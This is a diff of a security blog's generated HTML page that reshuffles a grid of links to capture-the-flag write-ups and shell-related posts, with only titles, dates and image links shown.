+      <time lang="el">22 Ιουν 2019</time>
     </footer>
   </a>
 </article>
@@ -1225,6 +1669,78 @@ fortune# cat /root/root.txt
           
            
            
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1342,254 +1858,6 @@ fortune# cat /root/root.txt
            
            
            
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
     <div class="cell">
@@ -1605,98 +1873,6 @@ fortune# cat /root/root.txt
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1750,22 +1926,6 @@ fortune# cat /root/root.txt
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
@@ -1803,6 +1963,8 @@ fortune# cat /root/root.txt
            
            
           
+          
+           
            
            
            
@@ -1810,27 +1972,9 @@ fortune# cat /root/root.txt
            
            
            
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Nineveh write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Dec 2017</time>
-      <time lang="el">17 Δεκ 2017</time>
-    </footer>
-  </a>
-</article>
-
            
           
+           
            
            
            
@@ -1838,15 +1982,9 @@ fortune# cat /root/root.txt
            
            
            
-          
-           
-           
            
           
            
-           
-           
-          
            
            
            
@@ -1854,15 +1992,9 @@ fortune# cat /root/root.txt
            
            
            
-          
-           
-           
            
           
            
-           
-           
-          
            
            
            
@@ -1870,15 +2002,9 @@ fortune# cat /root/root.txt
            
            
            
-          
-           
-           
            
           
            
-           
-           
-          
            
            
            
@@ -1886,15 +2012,9 @@ fortune# cat /root/root.txt
            
            
            
-          
-           
-           
            
           
            
-           
-           
-          
            
            
            
@@ -1902,15 +2022,9 @@ fortune# cat /root/root.txt
            
            
            
-          
-           
-           
            
           
            
-           
-           
-          
            
            
            
@@ -1918,27 +2032,9 @@ fortune# cat /root/root.txt
            
            
            
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
+           
            
            
            
@@ -1946,11 +2042,37 @@ fortune# cat /root/root.txt
            
            
            
+           
+          
+           
+           
+           
+           
           
            
            
            
+           
           
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
           
            
            
@@ -2212,143 +2334,6 @@ fortune# cat /root/root.txt
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reverse shells</h3>
-      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">12 Apr 2018</time>
-      <time lang="el">12 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
-      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 Apr 2018</time>
-      <time lang="el">13 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
           
            
            
@@ -2460,25 +2445,21 @@ fortune# cat /root/root.txt
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -2544,6 +2525,27 @@ fortune# cat /root/root.txt
            
            
            
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
+      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 Apr 2018</time>
+      <time lang="el">13 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -2701,6 +2703,86 @@ fortune# cat /root/root.txt
            
            
            
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/oracle/" class="clearfix">
     <div class="cell">
@@ -2716,61 +2798,6 @@ fortune# cat /root/root.txt
   </a>
 </article>
 
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
            
